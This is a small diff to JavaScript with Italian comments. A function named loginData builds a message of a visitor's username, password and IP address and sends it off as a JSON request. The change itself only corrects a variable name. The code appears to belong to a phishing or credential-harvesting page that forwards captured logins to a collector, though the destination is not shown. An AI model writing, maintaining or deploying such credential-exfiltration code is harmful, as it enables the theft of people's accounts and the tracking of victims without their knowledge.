@@ -89,7 +89,7 @@ function loginData() {
 
     request.setRequestHeader('Content-type', 'application/json');
 
-    let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IpAddressVisitor;
+    let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IPAddressVisitor;
 
 
     // Salva in variabile dataFormattata la data dell'accesso dell'utente
